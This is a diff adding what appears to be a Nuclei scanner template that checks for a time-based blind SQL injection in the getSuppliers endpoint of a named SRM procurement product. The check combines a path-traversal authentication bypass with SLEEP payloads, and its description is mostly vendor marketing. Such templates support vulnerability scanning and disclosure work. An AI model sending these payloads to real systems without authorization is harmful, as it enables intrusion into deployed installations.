@@ -1,0 +1,25 @@
+id: SRM-getSuppliers-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 智互联(深圳)科技有限公司SRM智联云采系统针对企业供应链管理难题，及智能化转型升级需求，智联云采依托人工智能、物联网、大数据、云等技术，通过软硬件系统化方案，帮助企业实现供应商关系管理和采购线上化、移动化、智能化，提升采购和协同效率，进而规避供需风险，强化供应链整合能力，构建企业利益共同体。智互联(深圳)科技有限公司SRM智联云采系统getSuppliers存在SQL注入漏洞。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%99%BA%E4%BA%92%E8%81%94%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/SRM%E6%99%BA%E8%81%94%E4%BA%91%E9%87%87%E7%B3%BB%E7%BB%9FgetSuppliers%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%283%29%29%29HckV%29--+HyuV"
+      - "{{BaseURL}}/adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%286%29%29%29HckV%29--+HyuV"
+      - "{{BaseURL}}/adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%289%29%29%29HckV%29--+HyuV"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
